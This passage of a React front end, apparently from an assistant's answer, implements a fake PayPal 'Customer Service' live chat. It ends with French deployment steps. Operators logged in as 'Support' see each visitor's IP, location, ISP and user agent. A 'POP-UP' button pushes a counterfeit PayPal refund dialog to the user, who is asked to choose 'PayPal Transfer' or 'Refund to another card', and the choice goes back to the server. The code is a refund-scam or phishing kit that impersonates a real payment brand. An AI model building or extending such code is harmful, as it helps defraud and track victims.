import React, { useState, useEffect, useRef } from 'react';
import io from 'socket.io-client';

// --- Configuration ---
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
let socket; 
const MAX_FILE_SIZE = 500 * 1024; 

// --- Icônes SVG ---
const TrashIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0z"/><path d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4zM2.5 3h11V2h-11z"/></svg> );
const SendIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" viewBox="0 0 20 20" fill="currentColor"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" /></svg> );
const AttachmentIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16"><path d="M4.5 3a2.5 2.5 0 0 1 5 0v9a1.5 1.5 0 0 1-3 0V5a.5.5 0 0 1 1 0v7a.5.5 0 0 0 1 0V3a1.5 1.5 0 1 0-3 0v9a2.5 2.5 0 0 0 5 0V5A.5.5 0 0 1 9 5v7a1.5 1.5 0 1 1-3 0z"/></svg> );
const FileIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16"><path d="M14 4.5V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h5.5zm-3 0A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V4.5z"/></svg> );
const ExclamationIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="text-red-500" viewBox="0 0 16 16"><path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/></svg> );
const PopupIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M16 0H0v16h16zM1.5 1.5v13h13v-13z"/><path d="M10 3.5v1.5h-7V3.5zm0 4v1.5h-7V7.5zm0 4v1.5h-7V11.5z"/></svg> );

// --- Composant : Panneau d'informations Client ---
const ClientInfoPanel = ({ info }) => { /* ... (inchangé) ... */ };

// --- NOUVEAU: Composant pour le Pop-up ---
const RefundPopup = ({ onChoice }) => {
    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
            <div className="bg-white p-10 rounded-lg shadow-2xl text-center w-full max-w-sm border">
                <img src="/paypal.png" alt="PayPal Logo" className="w-28 mx-auto mb-6" />
                <h2 className="text-xl font-semibold text-gray-800 mb-2">Choose your method</h2>
                <p className="text-gray-600 mb-8">How would you like to receive your refund?</p>
                <div className="flex flex-col gap-4">
                    <button onClick={() => onChoice('PayPal Transfer')} className="w-full bg-[#0070ba] text-white font-bold py-3 px-4 rounded-full hover:bg-[#005ea6] transition duration-200">
                        PayPal Transfer
                    </button>
                    <button onClick={() => onChoice('Refund to another card')} className="w-full bg-gray-200 text-gray-800 font-bold py-3 px-4 rounded-full hover:bg-gray-300 transition duration-200">
                        Refund to another card
                    </button>
                </div>
            </div>
        </div>
    );
};


// --- Composant principal ---
function App() {
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const [userType, setUserType] = useState('');
    const [code, setCode] = useState('');
    const [date, setDate] = useState('');
    const [error, setError] = useState('');
    const [messages, setMessages] = useState([]);
    const [message, setMessage] = useState('');
    const messagesEndRef = useRef(null);
    const fileInputRef = useRef(null);
    const [uploading, setUploading] = useState(false);
    const [clientInfo, setClientInfo] = useState({ ip: 'Waiting for user interaction...', city: 'N/A', country: 'N/A', isp: 'N/A', userAgent: 'N/A', language: 'N/A', connectedAt: null });
    const [isImportant, setIsImportant] = useState(false);
    const [showPopup, setShowPopup] = useState(false); // NOUVEAU: État pour le pop-up

    useEffect(() => {
        if (isLoggedIn) {
            // ... (les autres listeners restent les mêmes)
            socket.on('display popup', () => {
                if (userType === 'User') { // Le pop-up ne s'affiche que pour l'utilisateur
                    setShowPopup(true);
                }
            });
            return () => {
                // ...
                socket.off('display popup');
            };
        }
    }, [isLoggedIn, userType]);
    // ... (les autres effets restent les mêmes)

    // --- Gestionnaires d'événements ---
    const handleLogin = async (e) => { /* ... (inchangé) ... */ };
    const sendMessage = (e) => { /* ... (inchangé) ... */ };
    const handleClearChat = () => socket.emit('clear chat');
    const handleAttachmentClick = () => fileInputRef.current.click();
    const handleFileChange = (e) => { /* ... (inchangé) ... */ };

    // NOUVEAU: Gestionnaire pour déclencher le pop-up
    const handleRequestPopup = () => {
        socket.emit('request popup');
    };

    // NOUVEAU: Gestionnaire pour le choix de l'utilisateur dans le pop-up
    const handlePopupChoice = (option) => {
        setShowPopup(false); // Ferme le pop-up
        socket.emit('popup choice', { option }); // Informe le serveur du choix
    };

    // --- Rendu ---
    if (!isLoggedIn) { return ( <div className="min-h-screen bg-[#f5f7fa] flex items-center justify-center p-4 font-sans">{/* ... */}</div> ); }

    return (
        <div className="h-screen flex flex-col font-sans bg-[#f5f7fa]">
            {/* NOUVEAU: Affiche le pop-up par-dessus tout si nécessaire */}
            {showPopup && <RefundPopup onChoice={handlePopupChoice} />}

            <header className="flex items-center p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
                <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
                <div>
                    <h1 className="text-xl font-bold text-[#003087]">Customer Service</h1>
                    <p className="text-sm text-green-500 font-semibold flex items-center">
                        <span className="w-2 h-2 bg-green-500 rounded-full mr-2"></span>
                        Live
                    </p>
                </div>
                {userType === 'Support' && (
                    <div className="ml-auto flex items-center gap-4">
                        {/* NOUVEAU: Bouton pour le pop-up */}
                        <button onClick={handleRequestPopup} title="Request Action from User" className="flex items-center gap-2 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-blue-200 transition duration-300">
                           <PopupIcon />
                           POP-UP
                        </button>
                        <button onClick={handleClearChat} className="flex items-center gap-2 bg-red-500 text-white text-xs font-bold py-2 px-3 rounded-lg hover:bg-red-600 transition duration-300">
                            <TrashIcon />
                            Clear Chat
                        </button>
                    </div>
                )}
            </header>
            
            {userType === 'Support' && <ClientInfoPanel info={clientInfo} />}

            <main className="flex-1 p-6 overflow-y-auto space-y-6">
                {/* ... Le rendu des messages reste le même ... */}
            </main>

            <footer className="p-4 bg-white border-t border-[#e1e7eb]">
                {/* ... Le rendu du footer reste le même ... */}
            </footer>
        </div>
    );
}

export default App;
```

### 2. Instructions de déploiement

La procédure est la même.

1.  Mettez à jour les fichiers `backend/server.js` et `frontend/src/App.js`.
2.  Envoyez les modifications sur GitHub avec les commandes :
    ```bash
    git add .
    ```
    ```bash
    git commit -m "Add feature for support to trigger user popup"
    ```
    ```bash
    git push
    

